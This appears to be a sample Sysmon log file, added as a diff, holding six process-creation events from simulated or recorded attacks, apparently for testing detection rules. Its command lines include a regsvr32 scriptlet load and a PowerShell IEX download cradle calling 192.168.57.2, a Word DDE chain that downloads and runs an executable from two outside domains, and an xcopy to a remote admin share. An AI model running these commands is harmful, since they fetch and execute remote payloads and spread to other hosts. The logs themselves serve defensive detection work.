@@ -1,0 +1,300 @@
+{
+  "Event": {
+    "EventData": {
+      "CommandLine": "\"C:\\Windows\\system32\\regsvr32.exe\"  /s /n /u /i:http://192.168.57.2:8080/TGnALEigHGs8.sct scrobj.dll",
+      "Company": "Microsoft Corporation",
+      "CurrentDirectory": "C:\\Users\\Gen Eric\\",
+      "Description": "Microsoft(C) Register Server",
+      "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)",
+      "Hashes": "SHA1=645C424974FBE5FE7A04CAC73F1C23C96E1570B8,MD5=59BCE9F07985F8A4204F4D6554CFF708,SHA256=CA24AEF558647274D019DFB4D7FD1506D84EC278795C30BA53B81BB36130DC57,IMPHASH=84DA4A3165E248148F65DBE03B98A436",
+      "Image": "C:\\Windows\\System32\\regsvr32.exe",
+      "IntegrityLevel": "Medium",
+      "LogonGuid": "49F1AF32-DB3E-5A72-0000-00204F830100",
+      "LogonId": "0x0001834f",
+      "ParentCommandLine": "\"C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe\" ",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "ParentProcessGuid": "49F1AF32-DF5F-5A7A-0000-001028367201",
+      "ParentProcessId": "1352",
+      "ProcessGuid": "49F1AF32-DF73-5A7A-0000-0010D2E97201",
+      "ProcessId": "1444",
+      "Product": "Microsoft� Windows� Operating System",
+      "TerminalSessionId": "1",
+      "User": "GenEric-PC\\Gen Eric",
+      "UtcTime": "4242-04-24 13:37:42.422"
+    },
+    "System": {
+      "Channel": "Microsoft-Windows-Sysmon/Operational",
+      "Computer": "BLAHBLAH",
+      "Correlation": {},
+      "EventID": "1",
+      "EventRecordID": "5074393",
+      "Execution": {
+        "ProcessID": "1312",
+        "ThreadID": "1884"
+      },
+      "Keywords": "0x8000000000000000",
+      "Level": "4",
+      "Opcode": "0",
+      "Provider": {
+        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
+        "Name": "Microsoft-Windows-Sysmon"
+      },
+      "Security": {
+        "UserID": "S-1-5-18"
+      },
+      "Task": "1",
+      "TimeCreated": {
+        "SystemTime": "4242-04-24 13:37:42.422"
+      },
+      "Version": "5"
+    }
+  }
+}
+{
+  "Event": {
+    "EventData": {
+      "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c $B=new-object net.webclient;$B.proxy=[Net.WebRequest]::GetSystemWebProxy();$B.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $B.downloadstring('http://192.168.57.2:8080/TGnALEigHGs8');",
+      "Company": "Microsoft Corporation",
+      "CurrentDirectory": "C:\\Users\\Gen Eric\\",
+      "Description": "Windows PowerShell",
+      "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)",
+      "Hashes": "SHA1=5330FEDAD485E0E4C23B2ABE1075A1F984FDE9FC,MD5=852D67A27E454BD389FA7F02A8CBE23F,SHA256=A8FDBA9DF15E41B6F5C69C79F66A26A9D48E174F9E7018A371600B866867DAB8,IMPHASH=F2C0E8A5BD10DBC167455484050CD683",
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "IntegrityLevel": "Medium",
+      "LogonGuid": "49F1AF32-DB3E-5A72-0000-00204F830100",
+      "LogonId": "0x0001834f",
+      "ParentCommandLine": "\"C:\\Windows\\system32\\regsvr32.exe\"  /s /n /u /i:http://192.168.57.2:8080/TGnALEigHGs8.sct scrobj.dll",
+      "ParentImage": "C:\\Windows\\System32\\regsvr32.exe",
+      "ParentProcessGuid": "49F1AF32-DF73-5A7A-0000-0010D2E97201",
+      "ParentProcessId": "1444",
+      "ProcessGuid": "49F1AF32-DF73-5A7A-0000-001096157301",
+      "ProcessId": "2020",
+      "Product": "Microsoft� Windows� Operating System",
+      "TerminalSessionId": "1",
+      "User": "GenEric-PC\\Gen Eric",
+      "UtcTime": "4242-04-24 13:37:42.422"
+    },
+    "System": {
+      "Channel": "Microsoft-Windows-Sysmon/Operational",
+      "Computer": "BLAHBLAH",
+      "Correlation": {},
+      "EventID": "1",
+      "EventRecordID": "5075078",
+      "Execution": {
+        "ProcessID": "1312",
+        "ThreadID": "1884"
+      },
+      "Keywords": "0x8000000000000000",
+      "Level": "4",
+      "Opcode": "0",
+      "Provider": {
+        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
+        "Name": "Microsoft-Windows-Sysmon"
+      },
+      "Security": {
+        "UserID": "S-1-5-18"
+      },
+      "Task": "1",
+      "TimeCreated": {
+        "SystemTime": "4242-04-24 13:37:42.422"
+      },
+      "Version": "5"
+    }
+  }
+}
+{
+  "Event": {
+    "EventData": {
+      "CommandLine": "cmd /c PowerShell \"'PowerShell \"\"function Ktuakce([String] $dwjdasoigb){(New-Object System.Net.WebClient).DownloadFile($dwjdasoigb,''%%TMP%%\\Yvfytc.exe'');Start-Process ''%%TMP%%\\Yvfytc.exe'';}try{Ktuakce(''http://www.events4u.cz/kas23.png'')}catch{Ktuakce(''http://tregartha-dinnie.co.uk/kas23.png'')}'\"\" | Out-File -encoding ASCII -FilePath %%TMP%%\\Ryvqma-cgs.bat;Start-Process '%%TMP%%\\Ryvqma-cgs.bat' -WindowStyle Hidden\"",
+      "CurrentDirectory": "C:\\Users\\Gen Eric\\Desktop\\",
+      "Hashes": "SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163",
+      "Image": "C:\\Windows\\SysWOW64\\cmd.exe",
+      "IntegrityLevel": "Medium",
+      "LogonGuid": "49F1AF32-4475-59DB-0000-0020B8040100",
+      "LogonId": "0x000104b8",
+      "ParentCommandLine": "\"C:\\Program Files (x86)\\Microsoft Office\\Office12\\WINWORD.EXE\" /n /dde",
+      "ParentImage": "C:\\Program Files (x86)\\Microsoft Office\\Office12\\WINWORD.EXE",
+      "ParentProcessGuid": "49F1AF32-590E-59DB-0000-0010049F3000",
+      "ParentProcessId": "2848",
+      "ProcessGuid": "49F1AF32-5913-59DB-0000-0010023D3100",
+      "ProcessId": "1564",
+      "TerminalSessionId": "1",
+      "User": "GenEric-PC\\Gen Eric",
+      "UtcTime": "4242-04-24 13:37:42.422"
+    },
+    "System": {
+      "Channel": "Microsoft-Windows-Sysmon/Operational",
+      "Computer": "BLAHBLAH",
+      "Correlation": {},
+      "EventID": "1",
+      "EventRecordID": "230841",
+      "Execution": {
+        "ProcessID": "2160",
+        "ThreadID": "2380"
+      },
+      "Keywords": "0x8000000000000000",
+      "Level": "4",
+      "Opcode": "0",
+      "Provider": {
+        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
+        "Name": "Microsoft-Windows-Sysmon"
+      },
+      "Security": {
+        "UserID": "S-1-5-18"
+      },
+      "Task": "1",
+      "TimeCreated": {
+        "SystemTime": "4242-04-24 13:37:42.422"
+      },
+      "Version": "5"
+    }
+  }
+}
+{
+  "Event": {
+    "EventData": {
+      "CommandLine": "PowerShell  \"'PowerShell \"\"function Ktuakce([String] $dwjdasoigb){(New-Object System.Net.WebClient).DownloadFile($dwjdasoigb,''C:\\Users\\GENERI~1\\AppData\\Local\\Temp\\Yvfytc.exe'');Start-Process ''C:\\Users\\GENERI~1\\AppData\\Local\\Temp\\Yvfytc.exe'';}try{Ktuakce(''http://www.events4u.cz/kas23.png'')}catch{Ktuakce(''http://tregartha-dinnie.co.uk/kas23.png'')}'\"\" | Out-File -encoding ASCII -FilePath C:\\Users\\GENERI~1\\AppData\\Local\\Temp\\Ryvqma-cgs.bat;Start-Process 'C:\\Users\\GENERI~1\\AppData\\Local\\Temp\\Ryvqma-cgs.bat' -WindowStyle Hidden\"",
+      "CurrentDirectory": "C:\\Users\\Gen Eric\\Desktop\\",
+      "Hashes": "SHA1=04C5D2B4DA9A0F3FA8A45702D4256CEE42D8C48D,MD5=92F44E405DB16AC55D97E3BFE3B132FA,SHA256=6C05E11399B7E3C8ED31BAE72014CF249C144A8F4A2C54A758EB2E6FAD47AEC7,IMPHASH=96BA691B035D05F44E35AB23F6BA946C",
+      "Image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "IntegrityLevel": "Medium",
+      "LogonGuid": "49F1AF32-4475-59DB-0000-0020B8040100",
+      "LogonId": "0x000104b8",
+      "ParentCommandLine": "cmd /c PowerShell \"'PowerShell \"\"function Ktuakce([String] $dwjdasoigb){(New-Object System.Net.WebClient).DownloadFile($dwjdasoigb,''%TMP%\\Yvfytc.exe'');Start-Process ''%TMP%\\Yvfytc.exe'';}try{Ktuakce(''http://www.events4u.cz/kas23.png'')}catch{Ktuakce(''http://tregartha-dinnie.co.uk/kas23.png'')}'\"\" | Out-File -encoding ASCII -FilePath %TMP%\\Ryvqma-cgs.bat;Start-Process '%TMP%\\Ryvqma-cgs.bat' -WindowStyle Hidden\"",
+      "ParentImage": "C:\\Windows\\SysWOW64\\cmd.exe",
+      "ParentProcessGuid": "49F1AF32-5913-59DB-0000-0010023D3100",
+      "ParentProcessId": "1564",
+      "ProcessGuid": "49F1AF32-5913-59DB-0000-00101D483100",
+      "ProcessId": "788",
+      "TerminalSessionId": "1",
+      "User": "GenEric-PC\\Gen Eric",
+      "UtcTime": "4242-04-24 13:37:42.422"
+    },
+    "System": {
+      "Channel": "Microsoft-Windows-Sysmon/Operational",
+      "Computer": "BLAHBLAH",
+      "Correlation": {},
+      "EventID": "1",
+      "EventRecordID": "230989",
+      "Execution": {
+        "ProcessID": "2160",
+        "ThreadID": "2380"
+      },
+      "Keywords": "0x8000000000000000",
+      "Level": "4",
+      "Opcode": "0",
+      "Provider": {
+        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
+        "Name": "Microsoft-Windows-Sysmon"
+      },
+      "Security": {
+        "UserID": "S-1-5-18"
+      },
+      "Task": "1",
+      "TimeCreated": {
+        "SystemTime": "4242-04-24 13:37:42.422"
+      },
+      "Version": "5"
+    }
+  }
+}
+{
+  "Event": {
+    "EventData": {
+      "CommandLine": "PowerShell  \"function Ktuakce([String] $dwjdasoigb){(New-Object System.Net.WebClient).DownloadFile($dwjdasoigb,'C:\\Users\\GENERI~1\\AppData\\Local\\Temp\\Yvfytc.exe');Start-Process 'C:\\Users\\GENERI~1\\AppData\\Local\\Temp\\Yvfytc.exe';}try{Ktuakce('http://www.events4u.cz/kas23.png')}catch{Ktuakce('http://tregartha-dinnie.co.uk/kas23.png')}",
+      "CurrentDirectory": "C:\\Users\\Gen Eric\\Desktop\\",
+      "Hashes": "SHA1=04C5D2B4DA9A0F3FA8A45702D4256CEE42D8C48D,MD5=92F44E405DB16AC55D97E3BFE3B132FA,SHA256=6C05E11399B7E3C8ED31BAE72014CF249C144A8F4A2C54A758EB2E6FAD47AEC7,IMPHASH=96BA691B035D05F44E35AB23F6BA946C",
+      "Image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "IntegrityLevel": "Medium",
+      "LogonGuid": "49F1AF32-4475-59DB-0000-0020B8040100",
+      "LogonId": "0x000104b8",
+      "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\GENERI~1\\AppData\\Local\\Temp\\Ryvqma-cgs.bat\" \"",
+      "ParentImage": "C:\\Windows\\SysWOW64\\cmd.exe",
+      "ParentProcessGuid": "49F1AF32-5916-59DB-0000-0010F9963100",
+      "ParentProcessId": "3000",
+      "ProcessGuid": "49F1AF32-5916-59DB-0000-0010A39D3100",
+      "ProcessId": "2476",
+      "TerminalSessionId": "1",
+      "User": "GenEric-PC\\Gen Eric",
+      "UtcTime": "4242-04-24 13:37:42.422"
+    },
+    "System": {
+      "Channel": "Microsoft-Windows-Sysmon/Operational",
+      "Computer": "BLAHBLAH",
+      "Correlation": {},
+      "EventID": "1",
+      "EventRecordID": "232197",
+      "Execution": {
+        "ProcessID": "2160",
+        "ThreadID": "2380"
+      },
+      "Keywords": "0x8000000000000000",
+      "Level": "4",
+      "Opcode": "0",
+      "Provider": {
+        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
+        "Name": "Microsoft-Windows-Sysmon"
+      },
+      "Security": {
+        "UserID": "S-1-5-18"
+      },
+      "Task": "1",
+      "TimeCreated": {
+        "SystemTime": "4242-04-24 13:37:42.422"
+      },
+      "Version": "5"
+    }
+  }
+}
+{
+  "Event": {
+    "EventData": {
+      "CommandLine": "cmd.exe /c echo F | xcopy C:\\commander.exe \\\\calderadc\\c$\\commander.exe",
+      "Company": "Microsoft Corporation",
+      "CurrentDirectory": "C:\\Windows\\system32\\",
+      "Description": "Windows Command Processor",
+      "FileVersion": "6.1.7601.17514 (win7sp1_rtm.101119-1850)",
+      "Hashes": "SHA1=0F3C4FF28F354AEDE202D54E9D1C5529A3BF87D8,MD5=5746BD7E255DD6A8AFA06F7C42C1BA41,SHA256=DB06C3534964E3FC79D2763144BA53742D7FA250CA336F4A0FE724B75AAFF386,IMPHASH=D0058544E4588B1B2290B7F4D830EB0A",
+      "Image": "C:\\Windows\\System32\\cmd.exe",
+      "IntegrityLevel": "System",
+      "LogonGuid": "{49F1AF32-3AE3-5AC7-0000-002039031400}",
+      "LogonId": "0x140339",
+      "ParentCommandLine": "\"powershell\" -command -",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "ParentProcessGuid": "{49F1AF32-3AD5-5AC7-0000-001036B91300}",
+      "ParentProcessId": "2520",
+      "ProcessGuid": "{49F1AF32-3AE3-5AC7-0000-00107C031400}",
+      "ProcessId": "2944",
+      "Product": "Microsoft® Windows® Operating System",
+      "TerminalSessionId": "0",
+      "User": "NT AUTHORITY\\SYSTEM",
+      "UtcTime": "4242-04-24 13:37:42.422"
+    },
+    "System": {
+      "Channel": "Microsoft-Windows-Sysmon/Operational",
+      "Computer": "BLAHBLAH",
+      "Correlation": {},
+      "EventID": "1",
+      "EventRecordID": "914617",
+      "Execution": {
+        "ProcessID": "1456",
+        "ThreadID": "1712"
+      },
+      "Keywords": "0x8000000000000000",
+      "Level": "4",
+      "Opcode": "0",
+      "Provider": {
+        "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+        "Name": "Microsoft-Windows-Sysmon"
+      },
+      "Security": {
+        "UserID": "S-1-5-18"
+      },
+      "Task": "1",
+      "TimeCreated": {
+        "SystemTime": "4242-04-24 13:37:42.422"
+      },
+      "Version": "5"
+    }
+  }
+}
